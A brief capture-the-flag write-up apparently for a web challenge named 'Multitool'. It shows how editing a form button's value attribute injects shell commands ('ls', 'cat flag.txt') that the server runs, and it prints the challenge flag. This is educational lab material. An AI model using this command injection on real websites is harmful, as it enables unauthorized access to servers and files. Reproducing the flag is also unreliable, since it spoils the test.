# Multitool writeup
There are 3 buttons on the site. After clicking them, we might understand it's actually some linux utilities - `date`, `cal`, `uptime`. So, we can abuse it - change `value` button attribute on any button (for example, `date` button) to other command. Example:

Original:

```html
<input class="btn btn-info" id="1" name="date" type="submit" value="Date">
```

Changed:

```html
<input class="btn btn-info" id="1" name="date" type="submit" value="ls">
```

And it actually works, we see that there is `flag.txt` file near server. So, now we need to read it, for example we may use `cat`. Write `cat flag.txt` in value attribute, press the button and get the flag.

Flag: **flag{0MG_vuln3r4bl3_f0rm_1n_my_w3b5173_h0w_15_17_p0551bl3}**
